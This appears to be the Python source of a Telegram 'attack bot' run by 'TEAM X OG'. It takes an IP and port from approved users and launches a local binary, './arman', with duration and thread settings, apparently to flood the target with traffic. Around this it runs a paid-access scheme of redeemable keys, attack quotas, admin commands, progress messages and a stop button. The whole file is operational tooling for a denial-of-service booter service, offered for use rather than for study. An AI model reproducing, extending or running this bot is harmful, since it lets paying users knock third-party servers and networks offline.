# main.py
import telebot
import json
import os
import subprocess
import random
import time
import sys
import threading
from telebot import TeleBot, types
from config import *
from telebot import types

# Check required files
for f in ['config.py', 'data.json', 'arman']:
    if not os.path.exists(f):
        print(f"{f} not found")
        sys.exit(1)

# Initialize bot
bot = telebot.TeleBot(API_TOKEN)

# Load data
def load_data():
    try:
        with open('data.json') as f:
            return json.load(f)
    except:
        return {"users": {}, "attacks": {}, "keys": {}, "logs": []}

def save_data(data):
    with open('data.json', 'w') as f:
        json.dump(data, f)

def initialize_data():
    data = load_data()
    if ADMIN_ID not in data['users']:
        data['users'][ADMIN_ID] = {
            'approved': True,
            'attacks_left': 999999,
            'admin': True
        }
        save_data(data)

initialize_data()

def is_admin(user_id):
    return str(user_id) == ADMIN_ID

def is_approved(user_id):
    data = load_data()
    user_id = str(user_id)
    if user_id in data['users']:
        user_data = data['users'][user_id]
        if 'expiry' in user_data and time.time() > user_data['expiry']:
            del data['users'][user_id]
            save_data(data)
            return False
        return True
    for group, members in data.get('groups', {}).items():
        if user_id in members:
            return True
    return False

def parse_ports():
    ports = []
    for part in BLOCKED_PORTS.split(','):
        ports.extend([int(p) for p in part.strip().split() if p.isdigit()])
    return ports

BLOCKED_PORTS_LIST = parse_ports()

def check_auth(message):
    user_id = message.from_user.id
    if not is_approved(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 **ʏᴏᴜ'ʀᴇ ɴᴏт ᴀᴘᴘʀᴏᴠᴇᴅ тᴏ ᴜѕᴇ тнɪѕ ʙᴏт!**\n\nᴘʟᴇᴀѕᴇ ᴅᴍ @TEAM_X_OG ғᴏʀ ᴀᴄᴄᴇѕѕ", parse_mode='Markdown')
        return False
    return True

def run_attack(user_id, ip, port, chat_id):
    data = load_data()
    user = data['users'].get(str(user_id), {})
    
    if not is_admin(user_id):
        user['attacks_left'] = user.get('attacks_left', int(MAX_ATTACK_LIMIT)) - 1
        data['users'][str(user_id)] = user
    
    cmd = f"./arman {ip} {port} {Duration} {Threads}"
    process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
    
    attack_id = f"{user_id}_{time.time()}"
    initial_msg = bot.send_message(chat_id, "🌀 **Attack Initiated**")
    message_id = initial_msg.message_id
    
    data['attacks'][attack_id] = {
        "pid": process.pid,
        "user": user_id,
        "start": time.time(),
        "message_id": message_id,
        "chat_id": chat_id,
        "ip": ip,
        "port": port
    }
    
    save_data(data)
    threading.Thread(target=countdown, args=(chat_id, message_id, ip, port, user_id)).start()

def countdown(chat_id, message_id, ip, port, user_id):
    remaining = Duration
    video_path = "attack_started.mp4"  # Video file remains same

    try:
        user = bot.get_chat_member(chat_id, user_id).user
    except:
        user = None
    
    # Send video initially
    user_mention = f"[{user.first_name}](tg://user?id={user_id})" if user else f"User ID: {user_id}"
    initial_text = f"""
    🌀 **ᴀттᴀᴄᴋ ɪɴ ᴘʀᴏɢʀᴇѕѕ**
    
    ┌── 🔸 ɪᴘ: `{ip}`
    ├── 🔸 ᴘᴏʀт: `{port}`
    ├── 🔸 тɪᴍᴇ: {remaining}s
    ├── 🔸 ᴜѕᴇʀ: {user_mention}
    └── 🔸 ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @TEAM_X_OG
    """

    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🛑 ѕтᴏᴘ ᴀттᴀᴄᴋ", callback_data=f'stop_{message_id}'),
        types.InlineKeyboardButton("📊 ᴅᴇтᴀɪʟѕ", callback_data=f'details_{message_id}')
    )

    sent_message = bot.send_video(
        chat_id,
        video=open(video_path, "rb"),
        caption=initial_text,
        parse_mode="Markdown",
        reply_markup=markup
    )
    message_id = sent_message.message_id  # Update message ID with the sent video

    while remaining > 0:
        try:
            updated_text = f"""
            🌀 **ᴀттᴀᴄᴋ ɪɴ ᴘʀᴏɢʀᴇѕѕ**
            
            ┌── 🔸 ɪᴘ: `{ip}`
            ├── 🔸 ᴘᴏʀт: `{port}`
            ├── 🔸 тɪᴍᴇ: {remaining}s
            ├── 🔸 ᴜѕᴇʀ: {user_mention}
            └── 🔸 ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @TEAM_X_OG
            """
            
            bot.edit_message_caption(
                updated_text,
                chat_id,
                message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
            time.sleep(2)  # Keeping Telegram edit limit in mind
            remaining -= 2
        except Exception as e:
            break

    final_text = f"""
    ✅ **ᴀттᴀᴄᴋ ᴄᴏᴍᴘʟᴇтᴇᴅ**
    
    ┌── 🔸 ᴜѕᴇʀ: {user_mention if user else user_id}
    ├── 🔸 ɪᴘ: `{ip}:{port}`
    ├── 🔸 ᴅᴜʀᴀтɪᴏɴ: {Duration}s
    └── 🔸 ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @TEAM_X_OG
    """

    try:
        bot.edit_message_caption(
            final_text,
            chat_id,
            message_id,
            parse_mode='Markdown'
        )
    except:
        pass
    
    data = load_data()
    attack_id = f"{user_id}_{time.time() - Duration}"
    if attack_id in data['attacks']:
        del data['attacks'][attack_id]
        save_data(data)


@bot.message_handler(commands=['start'])
def start(message):
    video_path = "start.mp4"
    caption = """
    ✨ **Welcome to TEAM X OG Attack Bot** ✨
    
    ├── 🔸 Available Commands:
    │   ├── /start - Start the bot
    │   ├── /attack [ip] [port] - Start attack
    │   └── /myinfo - Show your info
    
    📍 Use /help for more details
    """
    
    bot.send_video(
        message.chat.id,
        video=open(video_path, "rb"),
        caption=caption,
        parse_mode="Markdown"
    )


@bot.message_handler(func=lambda m: m.text.lower().strip() in ['attack', '/attack'])
def handle_attack_usage(message):
    text = """
    ⚠️ **ɪɴᴄᴏᴍᴘʟᴇтᴇ ᴄᴏᴍᴍᴀɴᴅ!**
    
    ┌── 🔸 ᴜѕᴀɢᴇ: `attack <ip> <port>`
    └── 🔸 ᴇxᴀᴍᴘʟᴇ: `attack 1.1.1.1 80`
    """
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text.startswith('attack '))
def attack_cmd(message):
    if not check_auth(message):
        return
    
    try:
        _, ip, port = message.text.split()
        port = int(port)
    except:
        bot.reply_to(message, "❌ Invalid format! Use: attack [ip] [port]")
        return
    
    if port in BLOCKED_PORTS_LIST or port < 10000:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📛 Blocked Ports", callback_data='blocked_ports'))
        markup.add(types.InlineKeyboardButton("👨💻 Contact Owner", url=f"tg://user?id={ADMIN_ID}"))
        bot.send_photo(message.chat.id, BLOCKED_PHOTO, caption="🚫 **THIS PORT IS BLOCKED**", reply_markup=markup)
        return
    
    user_id = message.from_user.id
    data = load_data()
    
    if not is_admin(user_id) and data['users'].get(str(user_id), {}).get('attacks_left', 0) <= 0:
        bot.reply_to(message, "❌ You've reached your attack limit!")
        return
    
    run_attack(user_id, ip, port, message.chat.id)

@bot.message_handler(commands=['myinfo'])
def myinfo_handler(message):
    data = load_data()
    user_id = str(message.from_user.id)
    user_data = data['users'].get(user_id, {})
    
    approval_status = '✅' if is_approved(message.from_user.id) else '❌'
    expiry = user_data.get('expiry')
    expiry_text = f"{time.strftime('%Y-%m-%d %H:%M', time.localtime(expiry))}" if expiry else "ʟɪғᴇтɪᴍᴇ"
    
    group_memberships = []
    for group, members in data.get('groups', {}).items():
        if user_id in members:
            group_memberships.append(f"├── 🔸 {group}\n")
    
    info = f"""
    👤 **ᴜѕᴇʀ ɪɴғᴏʀᴍᴀтɪᴏɴ**
    
    ┌── 🔸 ᴜѕᴇʀ ɪᴅ: `{user_id}`
    ├── 🔸 ᴀᴘᴘʀᴏᴠᴀʟ ѕтᴀтᴜѕ: {approval_status}
    ├── 🔸 ᴀттᴀᴄᴋѕ ʀᴇᴍᴀɪɴɪɴɢ: {user_data.get('attacks_left', 0)}
    ├── 🔸 ᴀᴄᴄᴇѕѕ ᴇxᴘɪʀʏ: {expiry_text}
    │
    ├── **ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀѕʜɪᴘѕ**
    {"".join(group_memberships) if group_memberships else "└── 🔸 ɴᴏɴᴇ"}
    
    📊 **ʙᴏт ѕтᴀтɪѕтɪᴄѕ**
    ┌── 🔸 тᴏтᴀʟ ᴜѕᴇʀѕ: {len(data['users'])}
    ├── 🔸 ᴀᴄтɪᴠᴇ ᴀттᴀᴄᴋѕ: {len(data['attacks'])}
    └── 🔸 тᴏтᴀʟ ʟᴏɢѕ: {len(data['logs'])}
    """
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("📩 ᴄᴏɴтᴀᴄт ᴏᴡɴᴇʀ", url=f"tg://user?id={ADMIN_ID}"),
        types.InlineKeyboardButton("📜 ɢᴇт ᴀᴄᴄᴇѕѕ", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}")
    )
    
    bot.reply_to(message, info, parse_mode='Markdown', reply_markup=markup)


@bot.message_handler(commands=['start'])
def start(message):
    text = """
    ✨ **Welcome to TEAM X OG Attack Bot** ✨
    
    ├── 🔸 Available Commands:
    │   ├── /start - Start the bot
    │   ├── /attack [ip] [port] - Start attack
    │   └── /myinfo - Show your info
    
    📍 Use /help for more details
    """
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text.lower().strip() in ['attack', '/attack'])
def handle_attack_usage(message):
    text = """
    ⚠️ **ɪɴᴄᴏᴍᴘʟᴇтᴇ ᴄᴏᴍᴍᴀɴᴅ!**
    
    ┌── 🔸 ᴜѕᴀɢᴇ: `attack <ip> <port>`
    └── 🔸 ᴇxᴀᴍᴘʟᴇ: `attack 1.1.1.1 80`
    """
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['stop'])
def stop_all(message):
    if not is_admin(message.from_user.id):
        return
    
    data = load_data()
    for attack in data['attacks'].values():
        try:
            os.kill(attack['pid'], 9)
        except:
            continue
    data['attacks'] = {}
    save_data(data)
    bot.reply_to(message, "✅ All attacks stopped!")

# Add these handlers below the existing admin commands in main.py

def convert_duration(dur):
    unit = dur[-1]
    val = int(dur[:-1])
    if unit == 'd': return val * 86400
    if unit == 'h': return val * 3600
    if unit == 'm': return val * 60
    return val

@bot.message_handler(commands=['add'])
def add_handler(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🚫 ᴜɴᴀᴜтнᴏʀɪᴢᴇᴅ ᴀᴄᴄᴇѕѕ!")
        return
    
    try:
        _, type_, target = message.text.split()
        data = load_data()
        
        if type_ == 'admin':
            data['admins'] = data.get('admins', [])
            if target not in data['admins']:
                data['admins'].append(target)
                save_data(data)
                reply = f"""
                ✅ **ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ**
                
                ├── 🔸 ᴜѕᴇʀ: `{target}`
                ├── 🔸 тʏᴘᴇ: ᴀᴅᴍɪɴ
                └── 🔸 ʙʏ: [{message.from_user.first_name}](tg://user?id={message.from_user.id})
                """
            else:
                reply = "⚠️ ᴜѕᴇʀ ɪѕ ᴀʟʀᴇᴀᴅʏ ᴀɴ ᴀᴅᴍɪɴ!"
        
        elif type_ == 'user':
            data['users'][target] = {'approved': True, 'attacks_left': int(MAX_ATTACK_LIMIT)}
            save_data(data)
            reply = f"""
            ✅ **ᴜѕᴇʀ ᴀᴘᴘʀᴏᴠᴇᴅ**
            
            ├── 🔸 ᴜѕᴇʀ: `{target}`
            ├── 🔸 ʟɪᴍɪт: {MAX_ATTACK_LIMIT}
            └── 🔸 ʙʏ: [{message.from_user.first_name}](tg://user?id={message.from_user.id})
            """
            
        bot.reply_to(message, reply, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"""
        ❌ **ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀт**
        
        ᴜѕᴇ: `/add <admin/user> <user_id>`
        ᴇxᴀᴍᴘʟᴇ: `/add user 123456789`
        """, parse_mode='Markdown')

@bot.message_handler(commands=['logs'])
def logs_handler(message):
    if not is_admin(message.from_user.id):
        return
    
    data = load_data()
    if not data['logs']:
        bot.reply_to(message, "📭 ɴᴏ ʟᴏɢѕ ғᴏᴜɴᴅ!")
        return
    
    log_text = "📜 **ᴀттᴀᴄᴋ ʟᴏɢѕ**\n\n"
    for log in data['logs'][-10:]:
        log_text += f"""
        ├── 🔸 ᴜѕᴇʀ: `{log['user_id']}`
        ├── 🔸 ɪᴘ: `{log['ip']}:{log['port']}`
        ├── 🔸 ᴅᴜʀᴀтɪᴏɴ: {log['duration']}ѕ
        └── 🔸 тɪᴍᴇ: {time.ctime(log['timestamp'])}\n\n
        """
    
    bot.reply_to(message, log_text, parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo_handler(message):
    data = load_data()
    user_id = str(message.from_user.id)
    info = f"""
    👤 **ᴜѕᴇʀ ɪɴғᴏ**
    
    ├── 🔸 ɪᴅ: `{user_id}`
    ├── 🔸 ᴀᴘᴘʀᴏᴠᴇᴅ: {'✅' if is_approved(message.from_user.id) else '❌'}
    ├── 🔸 ᴀᴛтᴀᴄᴋѕ ʟᴇғт: {data['users'].get(user_id, {}).get('attacks_left', 0)}
    └── 🔸 ᴀᴅᴍɪɴ: {'✅' if is_admin(message.from_user.id) else '❌'}
    
    📦 **ʙᴏт ɪɴғᴏ**
    ├── 🔸 ᴛᴏтᴀʟ ᴜѕᴇʀѕ: {len(data['users'])}
    ├── 🔸 ᴀᴄтɪᴠᴇ ᴀттᴀᴄᴋѕ: {len(data['attacks'])}
    └── 🔸 ᴛᴏтᴀʟ ʟᴏɢѕ: {len(data['logs'])}
    """
    bot.reply_to(message, info, parse_mode='Markdown')

@bot.message_handler(commands=['gen'])
def gen_handler(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        _, key, duration, uses = message.text.split()
        data = load_data()
        
        data['keys'][key] = {
            'duration': convert_duration(duration),
            'uses_left': int(uses),
            'created_at': time.time(),
            'created_by': message.from_user.id
        }
        save_data(data)
        
        reply = f"""
        🔑 **ᴋᴇʏ ɢᴇɴᴇʀᴀтᴇᴅ**
        
        ├── 🔸 ᴋᴇʏ: `{key}`
        ├── 🔸 ᴅᴜʀᴀтɪᴏɴ: {duration}
        ├── 🔸 ᴜѕᴇѕ: {uses}
        └── 🔸 ʙʏ: [{message.from_user.first_name}](tg://user?id={message.from_user.id})
        """
        bot.reply_to(message, reply, parse_mode='Markdown')
    except:
        bot.reply_to(message, """
        ❌ **ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀт**
        
        ᴜѕᴇ: `/gen <key> <duration> <uses>`
        ᴇxᴀᴍᴘʟᴇ: `/gen premium 1d 5`
        """, parse_mode='Markdown')

@bot.message_handler(commands=['limit'])
def limit_handler(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        _, limit, user_id = message.text.split()
        data = load_data()
        
        if user_id not in data['users']:
            bot.reply_to(message, "⚠️ ᴜѕᴇʀ ɴᴏт ғᴏᴜɴᴅ!")
            return
        
        data['users'][user_id]['attacks_left'] = int(limit)
        save_data(data)
        bot.reply_to(message, f"""
        ✅ **ʟɪᴍɪт ᴜᴘᴅᴀтᴇᴅ**
        
        ├── 🔸 ᴜѕᴇʀ: `{user_id}`
        └── 🔸 ɴᴇᴡ ʟɪᴍɪт: {limit}
        """, parse_mode='Markdown')
    except:
        bot.reply_to(message, """
        ❌ **ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀт**
        
        ᴜѕᴇ: `/limit <limit> <user_id>`
        ᴇxᴀᴍᴘʟᴇ: `/limit 10 123456789`
        """, parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_handler(message):
    if not is_admin(message.from_user.id):
        return
    
    try:
        _, type_, target = message.text.split()
        data = load_data()
        
        if type_ == 'admin':
            if target in data.get('admins', []):
                data['admins'].remove(target)
                reply = f"✅ **ᴀᴅᴍɪɴ ʀᴇᴍᴏᴠᴇᴅ**\n`{target}`"
            else:
                reply = "⚠️ ᴜѕᴇʀ ɴᴏт ᴀɴ ᴀᴅᴍɪɴ!"
        
        elif type_ == 'user':
            if target in data['users']:
                del data['users'][target]
                reply = f"✅ **ᴜѕᴇʀ ʀᴇᴍᴏᴠᴇᴅ**\n`{target}`"
            else:
                reply = "⚠️ ᴜѕᴇʀ ɴᴏт ғᴏᴜɴᴅ!"
        
        save_data(data)
        bot.reply_to(message, reply)
    except:
        bot.reply_to(message, """
        ❌ **ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀт**
        
        ᴜѕᴇ: `/remove <user/admin> <user_id>`
        ᴇxᴀᴍᴘʟᴇ: `/remove user 123456789`
        """, parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_handler(message):
    try:
        _, key = message.text.split()
    except:
        bot.reply_to(message, """
        ❌ **ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀт**
        
        ᴜѕᴇ: `/redeem <key>`
        ᴇxᴀᴍᴘʟᴇ: `/redeem premium`
        """, parse_mode='Markdown')
        return

    data = load_data()
    user_id = str(message.from_user.id)
    
    # Check key validity
    if key not in data['keys']:
        bot.reply_to(message, "🔴 **ɪɴᴠᴀʟɪᴅ ᴏʀ ᴇxᴘɪʀᴇᴅ ᴋᴇʏ!**")
        return
        
    key_data = data['keys'][key]
    
    # Check remaining uses
    if key_data['uses_left'] <= 0:
        bot.reply_to(message, "🔴 **ᴛнɪѕ ᴋᴇʏ нᴀѕ ʙᴇᴇɴ ᴜѕᴇᴅ ᴜᴘ!**")
        del data['keys'][key]
        save_data(data)
        return
    
    # Apply key benefits
    expiry_time = time.time() + key_data['duration']
    data['users'][user_id] = {
        'expiry': expiry_time,
        'attacks_left': int(MAX_ATTACK_LIMIT),
        'approved': True
    }
    
    # Update key uses
    key_data['uses_left'] -= 1
    if key_data['uses_left'] <= 0:
        del data['keys'][key]
    else:
        data['keys'][key] = key_data
    
    save_data(data)
    
    # Format response
    expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
    response = f"""
    ✅ **ᴋᴇʏ ʀᴇᴅᴇᴇᴍᴇᴅ ѕᴜᴄᴄᴇѕѕғᴜʟʟʏ!**
    
    ┌── 🔸 ᴀᴄᴄᴇѕѕ ᴇxᴘɪʀᴇѕ: `{expiry_str}`
    ├── 🔸 ᴀттᴀᴄᴋ ʟɪᴍɪт: {MAX_ATTACK_LIMIT}
    └── 🔸 ʀᴇᴍᴀɪɴɪɴɢ ᴋᴇʏ ᴜѕᴇѕ: {key_data['uses_left']}
    """
    bot.reply_to(message, response, parse_mode='Markdown')

# Update is_approved check
def is_approved(user_id):
    data = load_data()
    user_id = str(user_id)
    
    # Check individual approval
    if user_id in data['users']:
        user_data = data['users'][user_id]
        if 'expiry' in user_data:
            if time.time() > user_data['expiry']:
                del data['users'][user_id]
                save_data(data)
                return False
        return True
    
    # Check group membership
    for group, members in data.get('groups', {}).items():
        if user_id in members:
            return True
            
    return False

# Callback handler
@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def callback_handler(call):
    message_id = call.data.split('_')[1]
    data = load_data()

    for aid, attack in list(data.get('attacks', {}).items()):  # Use list() to avoid runtime dictionary modification issues
        if attack.get('message_id') == message_id and attack.get('chat_id') == call.message.chat.id:
            try:
                os.kill(attack['pid'], 9)  # Terminate the process
            except ProcessLookupError:
                pass  # Process already terminated
            
            del data['attacks'][aid]
            save_data(data)
            
            bot.answer_callback_query(call.id, "Attack stopped!")

            try:
                bot.edit_message_text(
                    "🛑 **Attack Stopped**",
                    call.message.chat.id,
                    message_id,
                    parse_mode='Markdown'
                )
            except Exception as e:
                print(f"Failed to edit message: {e}")  # Log error instead of using a generic `pass`
            
            return  # Exit after processing the first match

# Run bot
if __name__ == '__main__':
    print("Bot running...")
    bot.infinity_polling()